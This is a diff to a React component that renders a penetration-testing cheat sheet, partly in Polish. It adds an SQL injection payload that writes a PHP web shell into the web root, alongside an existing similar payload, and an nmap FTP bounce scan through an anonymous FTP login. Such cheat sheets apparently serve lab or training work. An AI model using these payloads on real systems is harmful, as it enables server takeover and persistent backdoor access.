@@ -325,6 +325,9 @@ const Commends = () => {
                     <tr>
                     <td>cn' union select "",'{'<'}?php system($_REQUEST[0]); ?{'>'}', "", "" into outfile '/var/www/html/shell.php'-- -</td>
                     </tr>
+                    <tr>
+                    <td>SELECT "{`<`}?php echo shell_exec($_GET['c']);?{`>`}" INTO OUTFILE '/var/www/html/webshell.php';</td>
+                    </tr>
                 </tbody>
             </table>
             <table>
@@ -718,6 +721,11 @@ const Commends = () => {
                     <tr>
                         <td>FTP - skrypty</td>
                         <td>find / -type f -name ftp* 2{`>`}/dev/null | grep scripts</td>
+                        <td></td>
+                    </tr>
+                    <tr>
+                        <td>FTP - skanowanie infrastruktury przez host</td>
+                        <td>nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2</td>
                         <td></td>
                     </tr>
                     <tr>
